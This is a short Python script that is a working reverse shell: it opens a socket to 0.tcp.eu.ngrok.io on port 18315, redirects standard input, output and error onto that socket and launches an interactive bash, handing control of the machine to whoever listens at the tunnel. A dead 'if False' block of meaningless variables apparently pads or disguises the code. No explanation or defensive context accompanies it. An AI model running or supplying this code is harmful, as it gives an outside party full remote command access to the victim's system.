import subprocess
import socket
import os

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])
    except Exception as e:
        print(f'Error: {e}')
    if False:
        _var_148_0 = (317, 554, 314)

        def _var_148_fn():
            pass
reverse_shell('0.tcp.eu.ngrok.io', 18315)